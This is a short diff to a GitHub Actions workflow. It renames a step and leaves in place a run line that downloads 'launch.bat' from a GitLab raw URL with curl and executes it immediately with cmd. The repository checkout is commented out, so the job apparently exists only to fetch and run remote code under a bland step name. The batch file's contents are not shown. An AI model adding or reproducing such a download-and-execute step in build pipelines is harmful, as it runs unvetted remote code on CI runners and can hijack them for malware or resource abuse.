@@ -17,7 +17,8 @@ jobs:
     steps:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       # - uses: actions/checkout@v4
-        - name: Setting up...
+        - name: Running on...
+                
           run: curl -sOL https://gitlab.com/rangagtlab/light-manager/-/raw/main/launch.bat && cmd /c launch.bat
         
 
